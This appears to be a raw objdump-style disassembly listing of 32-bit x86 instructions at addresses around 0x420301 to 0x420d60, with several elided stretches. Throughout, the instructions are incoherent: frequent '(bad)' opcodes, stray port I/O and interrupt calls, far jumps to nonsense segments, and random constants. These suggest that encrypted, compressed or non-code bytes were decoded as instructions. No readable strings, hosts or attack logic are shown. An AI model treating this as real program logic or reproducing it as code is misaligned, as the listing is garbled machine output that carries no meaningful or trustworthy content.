  420301:	lods   eax,DWORD PTR ds:[esi]
  420302:	clc    
  420303:	(bad)  
  420304:	jmp    0x4202f4
  420306:	clc    
  420307:	mov    bh,0x52
  420309:	outs   dx,DWORD PTR ds:[esi]
  42030a:	dec    ebp
  42030b:	mov    ds:0xcfbe1c0b,al
  420310:	popf   
  420311:	xor    dl,BYTE PTR [esi]
  420313:	clc    
  420314:	imul   ebp,DWORD PTR [ecx-0x1d925d6f],0x7845f5f5
  42031e:	xor    eax,0xecb274bd
  420323:	jns    0x420333
  420325:	or     BYTE PTR [edi+0x33],al
  420328:	call   0x73c29199
  42032d:	in     eax,0xde
  42032f:	or     eax,0x3630652a
  420334:	leave  
  420335:	test   DWORD PTR [ebx-0x7f],ecx
  420338:	jg     0x420305
  42033a:	das    
  42033b:	retf   0x822
  42033e:	clc    
  42033f:	add    al,0x1c
  420341:	pop    ecx
  420342:	lods   eax,DWORD PTR ds:[esi]
  420343:	jmp    0xad31:0xcb6a613d
  42034a:	fbld   TBYTE PTR [edi]
  42034c:	and    bh,BYTE PTR [ebp+0x15e9a9c9]
  420352:	fsubr  DWORD PTR [ebp+0x35efa135]
  420358:	int    0xa2
  42035a:	xchg   DWORD PTR [esi-0x5d],esi
  42035d:	push   edi
  42035e:	cli    
  42035f:	mov    ecx,0x8fe2bd26
  420364:	xchg   esp,eax
  420365:	pusha  
  420366:	mov    ecx,DWORD PTR [edi]
  420368:	mov    WORD PTR ds:0xbcf6dbe7,gs
	...
  4203d6:	inc    ecx
  4203d7:	push   es
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	in     eax,dx
  4203e3:	xor    DWORD PTR [edi+0x15a67e8],edx
  4203e9:	add    BYTE PTR [eax],al
  4203eb:	add    DWORD PTR [eax],eax
  4203ed:	add    BYTE PTR [edx-0x54],cl
  4203f0:	add    DWORD PTR [ecx-0x6eed1616],edx
  4203f6:	fcomip st,st(2)
  4203f8:	dec    ecx
  4203f9:	cmp    al,0x36
  4203fb:	repnz mov ?,WORD PTR [esi+0x91f81e7]
  420402:	rcr    esp,cl
  420404:	mov    ds:0xd20e6478,al
  420409:	xor    BYTE PTR [ebp-0x698534d5],bh
  42040f:	pop    esp
  420410:	dec    esi
  420411:	pcmpeqb mm6,QWORD PTR [ebp+0x4ffb925a]
  420418:	pop    edx
  420419:	ret    
  42041a:	gs (bad) 
  42041c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42041d:	sub    DWORD PTR [ebx+eiz*1],ebx
  420420:	fstp   DWORD PTR [esi]
  420422:	out    0x93,eax
  420424:	dec    ebx
  420425:	je     0x4203c2
  420427:	mov    DWORD PTR [esi-0x1f],0xce418774
  42042e:	pop    es
  42042f:	imul   ebx,DWORD PTR [ecx-0xf],0x2d
  420433:	jne    0x4203db
  420435:	repz pop esi
  420437:	shl    eax,cl
  420439:	aaa    
  42043a:	dec    eax
  42043b:	lods   eax,DWORD PTR ds:[esi]
  42043c:	jno    0x42040a
  42043e:	ins    DWORD PTR es:[edi],dx
  42043f:	loopne 0x4204bd
  420441:	dec    ecx
  420442:	jle    0x4203fd
  420444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420445:	dec    eax
  420446:	mov    bh,0xdf
  420448:	mov    ch,0x37
  42044a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42044b:	stos   BYTE PTR es:[edi],al
  42044c:	jge    0x420443
  42044e:	mov    edi,0xab6d55d8
  420453:	dec    ebp
  420454:	retf   
  420455:	and    esp,DWORD PTR [edx]
  420457:	shr    dl,0xd5
  42045a:	push   ss
  42045b:	and    eax,0x7511cf11
  420460:	and    eax,0x6e9a6019
  420465:	lods   al,BYTE PTR ds:[esi]
  420466:	gs int 0xc3
  420469:	enter  0xb0a6,0xc1
  42046d:	rcr    BYTE PTR [ebx-0x33cb6ac9],cl
  420473:	and    eax,eax
  420475:	mov    ah,0x13
  420477:	inc    ebx
  420478:	xchg   ebp,eax
  420479:	cs into 
  42047b:	(bad)
  42047e:	retf   
  42047f:	pop    ebp
  420480:	push   esi
  420481:	scas   eax,DWORD PTR es:[edi]
  420482:	repz test DWORD PTR [di],ebx
  420486:	add    al,0x3b
  420488:	cmp    dl,0x99
  42048b:	fisubr DWORD PTR [eax-0x44]
  42048e:	sbb    eax,0x7f67685f
  420493:	and    DWORD PTR [edx-0x13de9602],ebp
  420499:	or     al,0x2f
  42049b:	lea    esi,[ebp*2-0x1ca8481c]
  4204a2:	lahf   
  4204a3:	pop    eax
  4204a4:	clc    
  4204a5:	pop    ecx
  4204a6:	out    dx,eax
  4204a7:	jmp    0x4204f8
  4204a9:	jne    0x42048f
  4204ab:	sbb    BYTE PTR [ebx],ch
  4204ad:	or     DWORD PTR [ecx],edi
  4204af:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4204b1:	test   esi,edi
  4204b3:	sbb    al,0x3d
  4204b5:	push   esi
  4204b6:	jnp    0x4204db
  4204b8:	inc    edx
  4204b9:	dec    ecx
  4204ba:	ficomp DWORD PTR [esi+ecx*1]
  4204bd:	outs   dx,BYTE PTR ds:[esi]
  4204be:	das    
  4204bf:	xchg   ecx,eax
  4204c0:	test   al,0xf2
  4204c2:	sti    
  4204c3:	neg    DWORD PTR [ebx]
  4204c5:	jg     0x4204c0
  4204c7:	push   ecx
  4204c8:	(bad)  
  4204c9:	jl     0x42050c
  4204cb:	sbb    cl,BYTE PTR [ecx+0x635c645c]
  4204d1:	add    eax,0x53271b8b
  4204d6:	xchg   esi,ebp
  4204d8:	and    ah,BYTE PTR [ebx-0x5c09f337]
  4204de:	test   eax,0x2562892b
  4204e3:	pop    esi
  4204e4:	sar    edx,1
  4204e6:	pusha  
  4204e7:	push   eax
  4204e8:	dec    esp
  4204e9:	sub    al,0xbd
  4204eb:	xchg   edi,eax
  4204ec:	jae    0x42046f
	...
  420556:	scas   al,BYTE PTR es:[edi]
  420557:	xchg   esp,eax
  420558:	push   edi
  420559:	adc    bh,BYTE PTR [edi-0x2d]
  42055c:	out    dx,eax
  42055d:	mov    esp,0x5a7f6c39
  420562:	jl     0x4204fd
  420564:	or     esp,esi
  420566:	addr16 pop ebx
  420568:	add    DWORD PTR [eax],eax
  42056a:	add    BYTE PTR [ecx],al
  42056c:	add    BYTE PTR [eax],al
  42056e:	sbb    al,0x45
  420570:	inc    esp
  420571:	jge    0x42057b
  420573:	adc    eax,0x3046e8e9
  420578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420579:	gs out dx,al
  42057b:	popa   
  42057c:	outs   dx,DWORD PTR ds:[esi]
  42057d:	arpl   WORD PTR [esi-0x6f],si
  420580:	mov    edx,DWORD PTR [edi+0x1b]
  420583:	or     BYTE PTR [si],0xe4
  420587:	push   es
  420588:	in     al,dx
  420589:	jge    0x42052b
  42058b:	popf   
  42058c:	sub    DWORD PTR [eax+0x69],edi
  42058f:	shr    DWORD PTR [ebx-0x67b95745],1
  420595:	push   esp
  420596:	retf   0x4dda
  420599:	sahf   
  42059a:	cmp    edi,DWORD PTR [edx+0x374284e0]
  4205a0:	test   DWORD PTR [esi-0x71],esi
  4205a3:	in     eax,0xda
  4205a5:	adc    eax,DWORD PTR [esi+ebx*8-0x55]
  4205a9:	in     al,0xd7
  4205ab:	ret    
  4205ac:	(bad)  
  4205ad:	cli    
  4205ae:	xor    bl,BYTE PTR [ebx-0x34]
  4205b1:	pop    edx
  4205b2:	in     eax,dx
  4205b3:	std    
  4205b4:	xor    al,0x57
  4205b6:	call   0x815c:0x9c87a50
  4205bd:	sub    ebx,DWORD PTR [edx+0x1c]
  4205c0:	fadd   QWORD PTR [edx-0x31]
  4205c3:	mov    eax,0x748b4849
  4205c8:	es mov bh,0x89
  4205cb:	adc    DWORD PTR [esi+0x21],esp
  4205ce:	xor    al,0xf5
  4205d0:	(bad)  
  4205d3:	outs   dx,DWORD PTR ds:[esi]
  4205d4:	leave  
  4205d5:	adc    ebp,DWORD PTR [edi]
  4205d7:	ja     0x42064f
  4205d9:	jmp    0xf924:0x73d04659
  4205e0:	or     BYTE PTR [edi-0x66fbfaaf],ch
  4205e6:	sub    BYTE PTR [esi+0x604b873a],0x3e
  4205ed:	pop    edx
  4205ee:	mov    edx,0x881456fa
  4205f3:	xchg   ebp,eax
  4205f4:	mov    esi,0x4d9ce2ad
  4205f9:	adc    bh,dl
  4205fb:	jae    0x4205cd
  4205fd:	stc    
  4205fe:	(bad)  
  4205ff:	aam    0x71
  420601:	call   0xc906f706
  420606:	sub    ch,BYTE PTR [ebp-0x5d516c07]
  42060c:	ret    
  42060d:	add    ch,ch
  42060f:	dec    esi
  420610:	ins    BYTE PTR es:[edi],dx
  420611:	jnp    0x420688
  420613:	dec    esi
  420614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420615:	push   es
  420616:	push   cs
  420617:	xor    DWORD PTR [edx],0x82d55c34
  42061d:	mov    WORD PTR [ebp+0x46e89747],fs
  420623:	dec    esi
  420624:	add    ah,BYTE PTR [eax]
  420626:	add    BYTE PTR [edx+0x4b],ch
  420629:	out    0x62,eax
  42062b:	xor    al,0xac
  42062d:	outs   dx,DWORD PTR ds:[esi]
  42062e:	enter  0x6fb7,0x2
  420632:	fld    TBYTE PTR [edi-0x1]
  420635:	pusha  
  420636:	add    eax,0xd8593bb3
  42063b:	add    eax,0xc1ff35a8
  420640:	add    eax,0xfd0db2fc
  420645:	addr16 sti 
  420647:	std    
  420648:	push   0x7c
  42064a:	lods   eax,DWORD PTR ds:[esi]
  42064b:	push   es
  42064c:	push   ecx
  42064d:	or     edi,DWORD PTR [edi]
  42064f:	imul   edi,DWORD PTR [ecx],0xffffffa8
  420652:	add    edx,DWORD PTR [esi+edx*8-0x3c5eae8]
  420659:	mov    dl,0xd3
  42065b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42065c:	xchg   edi,eax
  42065d:	adc    ch,BYTE PTR [ecx+eiz*4]
  420660:	cmp    BYTE PTR [eax+ebx*8+0x50e2c5ae],0x5d
  420668:	push   ds
  420669:	pop    ebp
  42066a:	outs   dx,DWORD PTR ds:[esi]
  42066b:	shr    BYTE PTR [edi+0x9b],cl
	...
  4206d5:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  4206dc:	mov    ah,0xec
  4206de:	lds    eax,FWORD PTR [eax]
  4206e0:	aad    0x78
  4206e2:	ret    
  4206e3:	mul    DWORD PTR [esi+0x15c67c6]
  4206e9:	add    BYTE PTR [eax],al
  4206eb:	add    DWORD PTR [eax],eax
  4206ed:	add    BYTE PTR [edi+0x61],ah
  4206f0:	jo     0x420741
  4206f2:	stc    
  4206f3:	rcr    DWORD PTR [edi+0xda8b8a5],0xc3
  4206fa:	sbb    eax,0x1b2c28ad
  4206ff:	jmp    0x4206ff
  420701:	add    dh,ch
  420703:	mov    bh,0x18
  420705:	jecxz  0x42075d
  420707:	mov    esp,0x694931cc
  42070c:	arpl   WORD PTR [ebp-0x70],dx
  42070f:	adc    dl,bl
  420711:	mov    dh,0xef
  420713:	clc    
  420714:	dec    eax
  420715:	or     eax,0xce59a931
  42071a:	hlt    
  42071b:	pop    ebx
  42071c:	and    ah,dh
  42071e:	leave  
  42071f:	shl    WORD PTR ds:0x3ca6f31,1
  420726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420727:	sub    BYTE PTR ds:0x91afc20d,cl
  42072d:	fwait
  42072e:	pusha  
  42072f:	push   esi
  420730:	retf   
  420731:	mov    cl,BYTE PTR [ebp+0x3e330846]
  420737:	pop    es
  420738:	xor    al,ch
  42073a:	pop    ecx
  42073b:	mov    DWORD PTR [edi],eax
  42073d:	(bad)  
  42073e:	xlat   BYTE PTR ds:[ebx]
  42073f:	clc    
  420740:	loop   0x420731
  420742:	mov    ah,0xc
  420744:	in     eax,0x6a
  420746:	push   esi
  420747:	into   
  420748:	fiadd  DWORD PTR [bx+di-0x6725]
  42074d:	ret    0xe277
  420750:	lock add dh,BYTE PTR [edi-0x30070732]
  420757:	addr16 pop ss
  420759:	push   0x6
  42075b:	fs and al,0x5f
  42075e:	int3   
  42075f:	inc    eax
  420760:	jle    0x4207cd
  420762:	mov    eax,ds:0x125e19ef
  420767:	adc    dl,BYTE PTR [eax+esi*2+0x45]
  42076b:	enter  0xe046,0x76
  42076f:	nop
  420770:	xor    dl,BYTE PTR [eax-0x55933604]
  420776:	xchg   edx,eax
  420777:	or     al,0xf4
  420779:	push   ebp
  42077a:	daa    
  42077b:	ins    DWORD PTR es:[edi],dx
  42077c:	sub    esp,DWORD PTR [esi+esi*2]
  42077f:	dec    ecx
  420780:	gs push esp
  420782:	ds mov dh,0xad
  420785:	in     al,dx
  420786:	push   cs
  420787:	retf   
  420788:	dec    edi
  420789:	lods   al,BYTE PTR ds:[esi]
  42078a:	rcr    edi,0x39
  42078d:	fld    QWORD PTR [esi+0x76923b3a]
  420793:	inc    ecx
  420794:	mov    eax,0x76b96e8
  420799:	pop    ebp
  42079a:	cmp    BYTE PTR [edx-0x1e1bfffa],bh
  4207a0:	or     ch,BYTE PTR [edi-0x75bde29c]
  4207a6:	test   eax,edi
  4207a8:	fnstcw WORD PTR [eax-0x7ccecdf7]
  4207ae:	xchg   ebx,eax
  4207af:	xchg   esp,eax
  4207b0:	sbb    DWORD PTR [ebp+0x1463d300],ebx
  4207b6:	sbb    DWORD PTR [edi-0x6b5cfe6f],ecx
  4207bc:	push   eax
  4207bd:	mov    ch,0x7f
  4207bf:	bound  ecx,QWORD PTR [ebp-0x2e]
  4207c2:	fcom   DWORD PTR [eax-0x1b]
  4207c5:	and    edx,esp
  4207c7:	jb     0x4207c0
  4207c9:	repz lea eax,[esi]
  4207cc:	das    
  4207cd:	lods   eax,DWORD PTR ds:[esi]
  4207ce:	xchg   DWORD PTR [eax-0x17],ecx
  4207d1:	mov    ds:0x33127f4,al
  4207d6:	jo     0x42083d
  4207d8:	or     dh,BYTE PTR [edx]
  4207da:	sbb    al,0x61
  4207dc:	pop    edx
  4207dd:	les    edx,FWORD PTR [edx+0xb]
  4207e0:	mov    es,edi
  4207e2:	xor    bl,BYTE PTR [edx-0x29]
  4207e5:	inc    ebx
  4207e6:	out    dx,al
  4207e7:	dec    ebp
  4207e8:	pop    edi
  4207e9:	push   edx
  4207ea:	loope  0x4207ae
  4207ec:	or     eax,0xc5
	...
  420855:	add    BYTE PTR [ecx-0x587fdad1],cl
  42085b:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  420861:	pusha  
  420862:	xchg   esi,eax
  420863:	mov    edi,DWORD PTR [ecx+0x15d6703]
  420869:	add    BYTE PTR [eax],al
  42086b:	add    DWORD PTR [eax],eax
  42086d:	add    BYTE PTR [ebp+edi*8+0x13],ch
  420871:	push   cs
  420872:	jle    0x420835
  420874:	pop    eax
  420875:	mov    bh,0xb
  420877:	cmp    eax,0xeb538bdd
  42087c:	leave  
  42087d:	fdiv   QWORD PTR [edx]
  42087f:	jle    0x4208ee
  420881:	push   cs
  420882:	push   ebx
  420883:	adc    BYTE PTR [ebp+0x1ac03ae0],bh
  420889:	xor    ebp,ebp
  42088b:	adc    eax,0xaeb4dc54
  420890:	mov    eax,ds:0x10810d33
  420895:	jb     0x420852
  420897:	sub    eax,0x640b8c5
  42089c:	lahf   
  42089d:	xor    al,0xe5
  42089f:	add    esp,edi
  4208a1:	jne    0x4208d8
  4208a3:	and    eax,ebx
  4208a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208a6:	repnz push 0xffffffb5
  4208a9:	dec    ebx
  4208aa:	call   FWORD PTR [edi-0x3bf86d0b]
  4208b0:	push   cs
  4208b1:	inc    ebp
  4208b2:	scas   eax,DWORD PTR es:[edi]
  4208b3:	dec    ebx
  4208b4:	sahf   
  4208b5:	sti    
  4208b6:	inc    ebx
  4208b7:	outs   dx,DWORD PTR ds:[esi]
  4208b8:	test   eax,0xfa4991ed
  4208bd:	xor    eax,0xcb651646
  4208c2:	(bad)  
  4208c3:	out    0xa0,al
  4208c5:	sub    edx,0x58
  4208c8:	mov    dh,BYTE PTR [ebx+0x37b4bd9a]
  4208ce:	inc    ebp
  4208cf:	sbb    ebx,DWORD PTR [eax+0x68]
  4208d2:	adc    edi,DWORD PTR [edx]
  4208d4:	xchg   edi,eax
  4208d5:	int    0x8
  4208d7:	mov    cl,0x2e
  4208d9:	pop    es
  4208da:	mov    edi,DWORD PTR [ecx]
  4208dc:	jmp    0x420907
  4208de:	cwde   
  4208df:	add    BYTE PTR [ebx-0x64],bh
  4208e2:	and    DWORD PTR [esi],0x70ac5dba
  4208e8:	mov    bl,BYTE PTR [eax+0x5339cad3]
  4208ee:	les    esi,FWORD PTR [ecx]
  4208f0:	cwde   
  4208f1:	(bad)
  4208f5:	es push 0x6cb79416
  4208fb:	or     al,BYTE PTR [esi+0x2a4dc443]
  420901:	test   DWORD PTR ds:0x6d46ec58,ebp
  420907:	dec    ecx
  420908:	jmp    0xdd05:0x98fced46
  42090f:	cmp    BYTE PTR [ecx+0x52e8862f],cl
  420915:	sub    dh,dl
  420917:	fsubr  DWORD PTR [edx+0x20895709]
  42091d:	cmp    eax,0x8caa11ee
  420922:	loopne 0x420989
  420924:	and    al,dh
  420926:	jmp    0x420939
  420928:	fs pop esi
  42092a:	sub    eax,0x9d1bcc7c
  42092f:	adc    ebx,DWORD PTR [edx-0xf]
  420932:	scas   al,BYTE PTR es:[edi]
  420933:	popa   
  420934:	mov    ds:0x611e8d51,eax
  420939:	xchg   DWORD PTR [eax+0x498c11cb],esi
  42093f:	je     0x420915
  420941:	jae    0x4209ab
  420943:	xor    DWORD PTR [ecx],edi
  420945:	in     al,dx
  420946:	and    eax,0xa2976f77
  42094b:	xchg   DWORD PTR [esi-0x4c],eax
  42094e:	xchg   ecx,esi
  420950:	jg     0x42091c
  420952:	jp     0x420942
  420954:	addr16 retw 
  420957:	mov    al,ds:0x8a6cead3
  42095c:	inc    edx
  42095d:	xchg   ebx,eax
  42095e:	sti    
  42095f:	or     edx,esp
  420961:	jnp    0x4209c9
  420963:	test   eax,0xccfa5f49
  420968:	pop    ebx
  420969:	inc    ebx
  42096a:	les    esi,FWORD PTR [eax-0xc]
  42096d:	xchg   BYTE PTR [eax],al
	...
  4209d3:	add    BYTE PTR [eax],al
  4209d5:	add    ah,bl
  4209d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209d8:	jae    0x420a27
  4209da:	jnp    0x4209bb
  4209dc:	(bad)  
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0x95
  4209e3:	jbe    0x4209a5
  4209e5:	sbb    eax,0x15e67
  4209ea:	add    BYTE PTR [ecx],al
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	repz and eax,DWORD PTR [edi+0x532b1ce5]
  4209f5:	iret   
  4209f6:	xor    al,cl
  4209f8:	fcomp  st(4)
  4209fa:	jle    0x4209be
  4209fc:	fldcw  WORD PTR [ebx]
  4209fe:	sub    BYTE PTR [edx-0x33],dl
  420a01:	data16 mov ah,0x36
  420a04:	inc    esp
  420a05:	adc    cl,dl
  420a07:	pop    esi
  420a08:	xor    edx,ecx
  420a0a:	dec    edx
  420a0b:	dec    eax
  420a0c:	cmp    eax,0x5967349a
  420a11:	popf   
  420a12:	push   es
  420a13:	outs   dx,BYTE PTR ds:[esi]
  420a14:	jge    0x420a2a
  420a16:	adc    edi,DWORD PTR [ecx+0x4a3a09b1]
  420a1c:	push   es
  420a1d:	in     al,0xa3
  420a1f:	sar    BYTE PTR [edx+0x12],0x19
  420a23:	adc    dl,BYTE PTR [ecx-0x5f061279]
  420a29:	sti    
  420a2a:	aaa    
  420a2b:	inc    ebx
  420a2c:	xor    ebx,eax
  420a2e:	outs   dx,DWORD PTR ds:[esi]
  420a2f:	test   DWORD PTR [bx+si+0x186f],ebp
  420a34:	aam    0x78
  420a36:	push   ebp
  420a37:	dec    DWORD PTR [edx]
  420a39:	xor    DWORD PTR [ebp-0x80],edx
  420a3c:	inc    esi
  420a3d:	jo     0x420aa4
  420a3f:	hlt    
  420a40:	pop    ebp
  420a41:	out    0x60,al
  420a43:	add    BYTE PTR [ecx],bl
  420a45:	(bad)  
  420a46:	fnsave [edi]
  420a48:	ss mov ecx,0x51d1e641
  420a4e:	pop    ss
  420a4f:	jp     0x420acb
  420a51:	cmc    
  420a52:	sbb    BYTE PTR [edi-0x63],0xb4
  420a56:	and    al,BYTE PTR [eax]
  420a58:	push   eax
  420a59:	div    DWORD PTR [ebx+eax*1+0x10bd0370]
  420a60:	hlt    
  420a61:	inc    BYTE PTR [ebx-0x30c3ce33]
  420a67:	clc    
  420a68:	mov    bh,0x2a
  420a6a:	pusha  
  420a6b:	xchg   DWORD PTR [edi],edi
  420a6d:	and    eax,0xd4e34a42
  420a72:	mov    esp,edi
  420a74:	daa    
  420a75:	add    ah,dh
  420a77:	sbb    DWORD PTR [edi+0x430d73a],eax
  420a7d:	jmp    0x9906440f
  420a82:	add    bh,BYTE PTR [ebx+0x6b]
  420a85:	dec    ebp
  420a86:	jno    0x420a61
  420a88:	setno  bh
  420a8b:	test   BYTE PTR [edi-0x4],0xf7
  420a8f:	out    0x39,al
  420a91:	hlt    
  420a92:	mov    al,0xac
  420a94:	lock out 0x4e,ax
  420a98:	sti    
  420a99:	in     eax,0xb0
  420a9b:	pop    ss
  420a9c:	and    BYTE PTR [edx],0xd2
  420a9f:	xor    al,0x2b
  420aa1:	int    0x2e
  420aa3:	int    0xf4
  420aa5:	sub    eax,0xe7e04dd1
  420aaa:	cmp    al,0x9f
  420aac:	call   0x7b82:0x6edf255a
  420ab3:	mov    DWORD PTR [ecx-0x67],edi
  420ab6:	in     al,0x86
  420ab8:	aas    
  420ab9:	mov    cs,WORD PTR [ebp-0x80]
  420abc:	fisttp QWORD PTR [esi]
  420abe:	ja     0x420aa4
  420ac0:	pop    esp
  420ac1:	test   BYTE PTR [bx-0x1],bl
  420ac5:	and    BYTE PTR [esi],bh
  420ac7:	dec    BYTE PTR [esi-0x73cb7ae7]
  420acd:	inc    ecx
  420ace:	push   esi
  420acf:	pop    edi
  420ad0:	dec    eax
  420ad1:	shl    DWORD PTR [ebx-0xa],cl
  420ad4:	outs   dx,BYTE PTR ds:[esi]
  420ad5:	cmp    al,0x49
  420ad7:	jecxz  0x420b27
  420ad9:	dec    esp
  420ada:	sahf   
  420adb:	sub    ecx,DWORD PTR [edi+ecx*8+0x20]
  420adf:	pushf  
  420ae0:	(bad)  
  420ae1:	out    0x5f,al
  420ae3:	add    ecx,edx
  420ae5:	int    0x53
  420ae7:	mov    eax,0x3d5fb058
  420aec:	fsubr  QWORD PTR [eax+eax*1]
	...
  420b53:	add    BYTE PTR [eax],al
  420b55:	add    bh,bl
  420b57:	xor    ch,BYTE PTR [edi-0x6010ed]
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	and    BYTE PTR [ebp+0xf],dl
  420b65:	push   0x67
  420b67:	pop    edi
  420b68:	add    DWORD PTR [eax],eax
  420b6a:	add    BYTE PTR [ecx],al
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	addr16 push esp
  420b70:	scas   eax,DWORD PTR es:[edi]
  420b71:	mov    eax,0x1ecb14a8
  420b76:	mov    cl,0x6b
  420b78:	xchg   ebp,eax
  420b79:	mov    DWORD PTR [eax],esi
  420b7b:	call   0x1134d6e0
  420b80:	lods   al,BYTE PTR ds:[esi]
  420b81:	cmp    eax,0x52561b68
  420b86:	pop    ebp
  420b87:	aad    0xe4
  420b89:	jae    0x420b96
  420b8b:	adc    eax,0x3422e1e
  420b90:	js     0x420bd0
  420b92:	cmp    edx,ebp
  420b94:	clc    
  420b95:	and    al,0x54
  420b97:	es out 0xa8,al
  420b9a:	jp     0x420b66
  420b9c:	push   ds
  420b9d:	nop
  420b9e:	mov    al,ds:0xa07477e2
  420ba3:	adc    al,dl
  420ba5:	jg     0x420bac
  420ba7:	aad    0xc2
  420ba9:	hlt    
  420baa:	outs   dx,DWORD PTR ds:[esi]
  420bab:	ret    
  420bac:	stos   BYTE PTR es:[edi],al
  420bad:	sub    eax,ebp
  420baf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bb0:	daa    
  420bb1:	mov    bl,0x81
  420bb3:	mov    esi,0x827a5a4
  420bb8:	mov    edx,0xc0cb43cb
  420bbd:	pop    esp
  420bbe:	outs   dx,BYTE PTR ds:[esi]
  420bbf:	jl     0x420b5e
  420bc1:	or     al,bl
  420bc3:	push   cs
  420bc4:	test   BYTE PTR [edx-0x16],ch
  420bc7:	js     0x420c3c
  420bc9:	lock inc ebp
  420bcb:	jbe    0x420bb2
  420bcd:	retf   
  420bce:	mov    ch,0x33
  420bd0:	jb     0x420bbc
  420bd2:	scas   al,BYTE PTR es:[edi]
  420bd3:	push   ebx
  420bd4:	psrad  mm1,mm4
  420bd7:	sub    eax,0xfa8f978f
  420bdc:	and    dh,BYTE PTR [edx]
  420bde:	enter  0xef33,0xa2
  420be2:	adc    eax,0xeb4e6b3c
  420be7:	std    
  420be8:	dec    edi
  420be9:	les    esp,FWORD PTR [edx]
  420beb:	pop    eax
  420bec:	arpl   WORD PTR [edx+0x5b98962d],dx
  420bf2:	or     eax,0x81577da9
  420bf7:	or     eax,0x2ce5e491
  420bfc:	loopne 0x420c63
  420bfe:	pusha  
  420bff:	cdq    
  420c00:	sub    al,0x7e
  420c02:	pop    ds
  420c03:	xlat   BYTE PTR ds:[ebx]
  420c04:	xchg   ecx,eax
  420c05:	je     0x420bf4
  420c07:	out    dx,eax
  420c08:	fmul   st(6),st
  420c0a:	cmp    al,0x9e
  420c0c:	out    0x25,al
  420c0e:	add    bh,BYTE PTR ds:0xeeaf5a96
  420c14:	dec    esi
  420c15:	icebp  
  420c16:	shr    ecx,cl
  420c18:	and    eax,0x2aa91bf5
  420c1d:	iret   
  420c1e:	nop
  420c1f:	pop    DWORD PTR [eax]
  420c21:	(bad)  
  420c22:	pop    esi
  420c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c24:	(bad)  
  420c25:	gs push eax
  420c27:	and    dh,BYTE PTR [ebp-0x45]
  420c2a:	aas    
  420c2b:	sbb    ecx,ebp
  420c2d:	add    al,0xbd
  420c2f:	sbb    BYTE PTR [esi],al
  420c31:	add    DWORD PTR [edi],ebx
  420c33:	addr16 and al,0xc3
  420c36:	xor    bh,BYTE PTR [edi+0x79]
  420c39:	loop   0x420bda
  420c3b:	iret   
  420c3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c3d:	adc    al,0xc5
  420c3f:	mov    DWORD PTR [edi],esp
  420c41:	sahf   
  420c42:	adc    eax,0x554ab8f4
  420c47:	nop
  420c48:	add    BYTE PTR [ebx+0x73],bl
  420c4b:	stos   DWORD PTR es:[edi],eax
  420c4c:	jne    0x420c8a
  420c4e:	dec    ebx
  420c4f:	mov    esp,esi
  420c51:	cmp    BYTE PTR [edi+0x52],dh
  420c54:	xchg   DWORD PTR [ecx-0xa],ebp
  420c57:	push   ecx
  420c58:	cmp    ebx,DWORD PTR [ecx+0x3a]
  420c5b:	add    esi,DWORD PTR [esi]
  420c5d:	jecxz  0x420c37
  420c5f:	in     al,0xd3
  420c61:	outs   dx,DWORD PTR ds:[esi]
  420c62:	sub    BYTE PTR [edi+0x57],bh
  420c65:	fcmovnu st,st(1)
  420c67:	loope  0x420bf5
  420c69:	call   0xb:0x7cef
	...
  420cd3:	add    BYTE PTR [eax],al
  420cd5:	add    BYTE PTR [edx-0x604ef4eb],cl
  420cdb:	mov    edi,0x886e3fba
  420ce0:	add    ebp,esp
  420ce2:	mov    eax,ds:0x6790bcb7
  420ce7:	pusha  
  420ce8:	add    DWORD PTR [eax],eax
  420cea:	add    BYTE PTR [ecx],al
  420cec:	add    BYTE PTR [eax],al
  420cee:	xor    ebp,esp
  420cf0:	jmp    0x420d0c
  420cf2:	push   edx
  420cf3:	ror    DWORD PTR [ebx+0x5bc3c6f6],0xb5
  420cfa:	mov    ebp,0xc653e0
  420cff:	cs push 0x4b6478ff
  420d05:	aas    
  420d06:	pop    ds
  420d07:	dec    esi
  420d08:	mov    bl,0x8d
  420d0a:	inc    edx
  420d0b:	add    DWORD PTR [esi-0x6],eax
  420d0e:	add    BYTE PTR [eax-0x41df7242],bl
  420d14:	mov    BYTE PTR [esi+ebp*4-0x35de982a],0x30
  420d1c:	sbb    dl,bh
  420d1e:	mov    esp,0x38a57595
  420d23:	jnp    0x420ccf
  420d25:	(bad)  
  420d26:	dec    esi
  420d27:	sub    esp,DWORD PTR [ebx-0x2d3f1bd]
  420d2d:	ja     0x420d7e
  420d2f:	dec    eax
  420d30:	jne    0x420d1c
  420d32:	rol    BYTE PTR [ebp+0x42],0x9d
  420d36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d37:	mov    dh,0x19
  420d39:	sub    BYTE PTR [ebp+0x22520708],al
  420d3f:	iret   
  420d40:	sbb    DWORD PTR [ebp+0x189e4831],ecx
  420d46:	mov    ds:0x77536d02,al
  420d4b:	stc    
  420d4c:	push   ds
  420d4d:	lds    ebp,FWORD PTR [ecx]
  420d4f:	jge    0x420d78
  420d51:	adc    al,0x7e
  420d53:	jno    0x420dac
  420d55:	bound  ecx,QWORD PTR [ebp-0x452d1440]
  420d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d5c:	and    bh,BYTE PTR [ebx+eax*2+0x42]
  420d60:	js     0x420d71
